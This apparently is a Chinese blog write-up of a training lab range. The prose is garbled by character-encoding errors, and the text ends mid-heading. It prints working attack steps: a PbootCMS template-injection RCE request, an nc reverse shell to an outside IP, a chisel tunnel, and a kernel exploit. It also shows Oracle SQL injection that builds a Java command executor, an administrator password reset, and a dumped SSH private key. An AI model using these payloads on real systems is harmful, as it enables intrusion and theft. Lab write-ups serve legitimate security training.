    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ²™ç ¾å¿«åˆ°æœŸäº†ï¼Œç´¢æ€§å¼€äº†ä¸ªæœ€è´µçš„æ‰“ï¼Œä½†æ˜¯å¤ªèœäº†è¿˜æ²¡æ‰“å®Œ</p><p><a href="https://fushuling.com/index.php/2024/02/10/__trashed/">https://fushuling.com/index.php/2024/02/10/__trashed/</a></p><p><a href="https://h0ny.github.io/posts/%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92-Endless-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#1722473---17225129">https://h0ny.github.io/posts/%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92-Endless-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#1722473---17225129</a></p><span id="more"></span><hr><p>ç»™äº†ä¸¤å°å¤–ç½‘é¶æœº</p><h1 id="å¤–ç½‘-pbootcms-172-23-4-32"><a href="#å¤–ç½‘-pbootcms-172-23-4-32" class="headerlink" title="å¤–ç½‘ - pbootcms - 172.23.4.32"></a>å¤–ç½‘ - pbootcms - 172.23.4.32</h1><p>ç›´æ¥æ‰¾ poc æ‰“</p><p><a href="https://guokeya.github.io/post/WscncUrcS/">https://guokeya.github.io/post/WscncUrcS/</a></p><p>ç›´æ¥æŠŠå‘½ä»¤å…¨éƒ¨ç¼–ç </p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/?a=&#125;&#123;pboot&#123;user:password&#125;:if(("sys\x74em")("\x77\x68\x6f\x61\x6d\x69"));//)&#125;xxx&#123;/pboot&#123;user:password&#125;:if&#125;</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">39.101.138.141</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://39.101.138.141/</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">lg=cn; PbootSystem=g9rqagsmpoa3r6gp98bujtuvtn</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†™ä¸äº†å½“å‰ç›®å½•ï¼Œé‚£å°±å¼¹ shellï¼Œbash å¼¹ä¸å‡ºæ¥ï¼Œæµ‹äº†ä¸€ä¸‹ç”¨ nc</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/bash <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">39.98</span>.125.107 <span class="token number">23333</span> <span class="token operator">></span>/tmp/f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¼¹ shell åå‘ç° data å’Œ runtime ç›®å½•å±äº www-data ç”¨æˆ·ï¼Œé‚£ä¹ˆå¯ä»¥ä¿®æ”¹è¿™ä¸¤ä¸ªæ–‡ä»¶å¤¹æœ‰å†™æƒé™ä»è€Œæƒé™ç»´æŒ</p><p>æ¥ä¸‹æ¥è¿›è¡Œææƒï¼Œ<code>uname -a</code> æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ä¸º <code>Linux iZ8vb4waku41fgiokivm1cZ 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</code></p><p>å¯ä»¥ä½¿ç”¨ <a href="https://github.com/Markakd/CVE-2022-2588">https://github.com/Markakd/CVE-2022-2588</a></p><p>ä¸Šä¼ ç»™æƒé™å¹¶æ‰§è¡Œå³å¯ç”Ÿæˆä¸€ä¸ªå…·æœ‰ root æƒé™çš„ç”¨æˆ·</p><p><img src="/blog/2025/10/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92/IMG-20251024165124493.png"></p><p><code>user:user</code> ç™»å½•å³å¯</p><p><img src="/blog/2025/10/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92/IMG-20251024165525518.png"></p><hr><h1 id="ä¸€å±‚å†…ç½‘"><a href="#ä¸€å±‚å†…ç½‘" class="headerlink" title="ä¸€å±‚å†…ç½‘"></a>ä¸€å±‚å†…ç½‘</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.23</span>.4.32     å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.23</span>.4.19     å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.23</span>.4.12     å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.23</span>.4.51     å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span>.9s<span class="token punctuation">]</span>     å­˜æ´»ä¸»æœºæ•°é‡: <span class="token number">4</span><span class="token punctuation">[</span><span class="token number">4</span>.9s<span class="token punctuation">]</span>     æœ‰æ•ˆç«¯å£æ•°é‡: <span class="token number">233</span><span class="token punctuation">[</span><span class="token number">4</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.23</span>.4.32:22<span class="token punctuation">[</span><span class="token number">5</span>.0s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.23</span>.4.32:80<span class="token punctuation">[</span><span class="token number">5</span>.0s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.23</span>.4.12:445<span class="token punctuation">[</span><span class="token number">5</span>.0s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.23</span>.4.12:135<span class="token punctuation">[</span><span class="token number">5</span>.0s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.23</span>.4.12:139<span class="token punctuation">[</span><span class="token number">5</span>.0s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.23</span>.4.19:80<span class="token punctuation">[</span><span class="token number">5</span>.0s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.23</span>.4.19:22<span class="token punctuation">[</span><span class="token number">5</span>.0s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.23</span>.4.51:1521<span class="token punctuation">[</span><span class="token number">5</span>.0s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.23</span>.4.51:139<span class="token punctuation">[</span><span class="token number">5</span>.0s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.23</span>.4.51:445<span class="token punctuation">[</span><span class="token number">5</span>.0s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.23</span>.4.51:135<span class="token punctuation">[</span><span class="token number">8</span>.0s<span class="token punctuation">]</span>     æ‰«æå®Œæˆ, å‘ç° <span class="token number">11</span> ä¸ªå¼€æ”¾ç«¯å£<span class="token punctuation">[</span><span class="token number">8</span>.0s<span class="token punctuation">]</span>     å­˜æ´»ç«¯å£æ•°é‡: <span class="token number">11</span><span class="token punctuation">[</span><span class="token number">8</span>.0s<span class="token punctuation">]</span>     å¼€å§‹æ¼æ´æ‰«æ<span class="token punctuation">[</span><span class="token number">8</span>.1s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç½‘ç«™æ ‡é¢˜ http://172.23.4.19        çŠ¶æ€ç :200 é•¿åº¦:481    æ ‡é¢˜:Search UserInfo<span class="token punctuation">[</span><span class="token number">8</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: <span class="token number">172.23</span>.4.12ä¸»æœºå: IZMN9U6ZO3VTRNZå‘ç°çš„ç½‘ç»œæ¥å£:   IPv4åœ°å€:      â””â”€ <span class="token number">172.23</span>.4.12      â””â”€ <span class="token number">172.24</span>.7.16<span class="token punctuation">[</span><span class="token number">8</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: <span class="token number">172.23</span>.4.51ä¸»æœºå: iZgg6avp17kmzrZå‘ç°çš„ç½‘ç»œæ¥å£:   IPv4åœ°å€:      â””â”€ <span class="token number">172.23</span>.4.51<span class="token punctuation">[</span><span class="token number">8</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetBios <span class="token number">172.23</span>.4.51     WORKGROUP<span class="token punctuation">\</span>IZGG6AVP17KMZRZ     <span class="token punctuation">[</span><span class="token number">8</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetBios <span class="token number">172.23</span>.4.12     PENTEST<span class="token punctuation">\</span>IZMN9U6ZO3VTRNZ       <span class="token punctuation">[</span><span class="token number">8</span>.2s<span class="token punctuation">]</span>     POCåŠ è½½å®Œæˆ: æ€»å…±387ä¸ªï¼ŒæˆåŠŸ387ä¸ªï¼Œå¤±è´¥0ä¸ª<span class="token punctuation">[</span><span class="token number">8</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç½‘ç«™æ ‡é¢˜ http://172.23.4.32        çŠ¶æ€ç :200 é•¿åº¦:19779  æ ‡é¢˜:PbootCMS-æ°¸ä¹…å¼€æºå…è´¹çš„PHPä¼ä¸šç½‘ç«™å¼€å‘å»ºè®¾ç®¡ç†ç³»ç»Ÿ<span class="token punctuation">[</span><span class="token number">8</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> æ£€æµ‹åˆ°æ¼æ´ http://172.23.4.32:80/www.zip poc-yaml-backup-file<span class="token punctuation">[</span><span class="token number">11</span>.4s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> ç›®æ ‡: http://172.23.4.32:80  æ¼æ´ç±»å‹: poc-yaml-phpstudy-nginx-wrong-resolve  æ¼æ´åç§°: php  è¯¦ç»†ä¿¡æ¯:        ä½œè€…:LoRexxar<span class="token punctuation">(</span>https://lorexxar.cn<span class="token punctuation">)</span>,0h1in9e<span class="token punctuation">(</span>https://www.ohlinge.cn<span class="token punctuation">)</span>        å‚è€ƒé“¾æ¥:https://www.seebug.org/vuldb/ssvid-98364<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»£ç†</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel server <span class="token parameter variable">-p</span> <span class="token number">33322</span> <span class="token parameter variable">--reverse</span>./chisel client <span class="token number">39.98</span>.125.107:33322 R:0.0.0.0:10721:socks<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="å¤–ç½‘-Oracle-æŸ¥è¯¢ç«™-172-23-4-19"><a href="#å¤–ç½‘-Oracle-æŸ¥è¯¢ç«™-172-23-4-19" class="headerlink" title="å¤–ç½‘ - Oracle æŸ¥è¯¢ç«™ - 172.23.4.19"></a>å¤–ç½‘ - Oracle æŸ¥è¯¢ç«™ - 172.23.4.19</h1><p><a href="https://y4er.com/posts/oracle-sql-inject/">https://y4er.com/posts/oracle-sql-inject/</a></p><p>å‘ç°å­˜åœ¨æ³¨å…¥ï¼Œå°è¯•æ”¶é›†ä¿¡æ¯ï¼Œå‘ç°æ˜¯ oracle æ•°æ®åº“ï¼Œè·å–ç‰ˆæœ¬</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">admin<span class="token string">' union select null,(SELECT banner FROM v$version WHERE banner LIKE '</span>Oracle<span class="token operator">%</span><span class="token number">25</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">from</span> dual <span class="token comment">-- +</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production</code></p><p>oracle å¯ä»¥è°ƒç”¨ java ç¨‹åºï¼Œå°è¯•æ‰§è¡Œå‘½ä»¤</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- åˆ›å»º java source</span>admin<span class="token string">' and (select dbms_xmlquery.newcontext('</span><span class="token keyword">declare</span> PRAGMA AUTONOMOUS_TRANSACTION<span class="token punctuation">;</span><span class="token keyword">begin</span> <span class="token keyword">execute</span> immediate <span class="token string">''</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token operator">AND</span> COMPILE JAVA SOURCE NAMED <span class="token string">"CommandExecutor"</span> <span class="token keyword">AS</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">public</span> class CommandExecutor &#123;    <span class="token keyword">public</span> static String <span class="token keyword">execute</span><span class="token punctuation">(</span>String command<span class="token punctuation">)</span>  &#123;        try &#123;            Process process <span class="token operator">=</span> Runtime<span class="token punctuation">.</span>getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>            InputStream inputStream <span class="token operator">=</span> process<span class="token punctuation">.</span>getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BufferedReader input <span class="token operator">=</span> new BufferedReader<span class="token punctuation">(</span>new InputStreamReader<span class="token punctuation">(</span>inputStream<span class="token punctuation">,</span> <span class="token string">"GBK"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String line<span class="token punctuation">;</span>            StringBuilder output <span class="token operator">=</span> new StringBuilder<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> input<span class="token punctuation">.</span>readLine<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token boolean">null</span><span class="token punctuation">)</span> &#123;                output<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            &#125;            input<span class="token punctuation">.</span><span class="token keyword">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> output<span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        &#125; catch <span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> &#123;            <span class="token keyword">return</span> e<span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        &#125;    &#125;&#125;<span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">commit</span><span class="token punctuation">;</span><span class="token keyword">end</span><span class="token punctuation">;</span><span class="token string">') from dual)>1 ---- åˆ›å»ºå‡½æ•°admin'</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> dbms_xmlquery<span class="token punctuation">.</span>newcontext<span class="token punctuation">(</span><span class="token string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''CREATE OR REPLACE FUNCTION execute_command(command IN VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME ''''CommandExecutor.execute(java.lang.String) return java.lang.String''''; '';commit;end;'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token comment">--</span><span class="token comment">-- æ‰§è¡Œå‡½æ•°</span>admin<span class="token string">' union select null,(select execute_command('</span>ipconfig'<span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">from</span> dual<span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/10/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92/IMG-20251024172331072.png"></p><p>æ˜¯ system æƒé™ï¼Œæ‰§è¡Œ ipconfig å¯çŸ¥æ•°æ®åº“ä¸»æœºçš„åœ°å€ä¸º 172.23.4.51</p><h1 id="IZGG6AVP17KMZRZ-172-23-4-51"><a href="#IZGG6AVP17KMZRZ-172-23-4-51" class="headerlink" title="IZGG6AVP17KMZRZ - 172.23.4.51"></a>IZGG6AVP17KMZRZ - 172.23.4.51</h1><p>é‚£ä¹ˆå…ˆåˆ›å»ºä¸€ä¸ª rdp ç”¨æˆ·ç™»ä¸Šå»</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net user administrator abc123!@<span class="token comment">#</span>net user administrator <span class="token operator">/</span>active:yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>éªŒè¯æ˜¯å¦åˆ›å»ºæˆåŠŸï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 <span class="token parameter variable">-q</span> cme rdp <span class="token number">172.23</span>.4.51 <span class="token parameter variable">-u</span> <span class="token string">'administrator'</span> <span class="token parameter variable">-p</span> <span class="token string">'abc123!@#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/10/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92/IMG-20251024175239912.png"></p><p>ç„¶å rdp ä¸Šå»ï¼Œflag åœ¨æ¡Œé¢</p><p><img src="/blog/2025/10/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92/IMG-20251024175436938.png"></p><p>readme.txt çš„å†…å®¹</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">å¯†ç è®°äº‹æœ¬usera@pentest.meAdmin3gv83<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="IZMN9U6ZO3VTRNZ-172-23-4-12-172-24-7-16"><a href="#IZMN9U6ZO3VTRNZ-172-23-4-12-172-24-7-16" class="headerlink" title="IZMN9U6ZO3VTRNZ - 172.23.4.12 - 172.24.7.16"></a>IZMN9U6ZO3VTRNZ - 172.23.4.12 - 172.24.7.16</h1><p>ä¸Šé¢å¾—åˆ°äº†å‡­æ®ï¼Œç›´æ¥ rdp ä¸Šå»å³å¯</p><p>æ³¨æ„è¿™å°æ˜¯åœ¨ PENTEST åŸŸä¸­çš„</p><p>flag å°±åœ¨æ¡Œé¢ä¸Š</p><p><img src="/blog/2025/10/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92/IMG-20251024180142656.png"></p><p>æ”¶é›†ä¿¡æ¯</p><p><img src="/blog/2025/10/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92/IMG-20251024180305728.png"></p><p>å‘ç°ç”¨æˆ·æ–‡ä»¶ä¸‹æœ‰ ssh æ–‡ä»¶å¤¹</p><p>æ‹¿åˆ°ç§é’¥</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">-----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>known_host</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">172.23.4.19 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFJJrccRyWXl3ukzzZQooQ1A/F1BhaBSJaZ7EaYbNKay7NB0NE7icsSZM63KcXKj5W5Fenhiz+JF7f4qyvzJpw4=172.24.7.23 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEKSjuMy2Pn3h2NFxVRc+uJXBgoq8YHKBvC683+Na10172.24.7.23 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHhESiXRwVnqgTtADKek0fxSQKchkXn7evdU9uFiZ+R0zn9BVBAS1maIfyVAAh6H3wgN2mJ7zG3nvQE7cvKZ5xQ=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆå¯ä»¥æ‹¿ç§é’¥ ssh è¿æ¥ 172.23.4.19 æ‹¿åˆ° oracle ç«™çš„ shell</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">ssh-keygen <span class="token operator">-</span>R 172<span class="token punctuation">.</span>23<span class="token punctuation">.</span>4<span class="token punctuation">.</span>19ssh <span class="token operator">-</span>i id_rsa root@172<span class="token punctuation">.</span>23<span class="token punctuation">.</span>4<span class="token punctuation">.</span>19<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2025/10/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92/IMG-20251024181651859.png"></p><h1 id="äºŒå±‚å†…ç½‘"><a 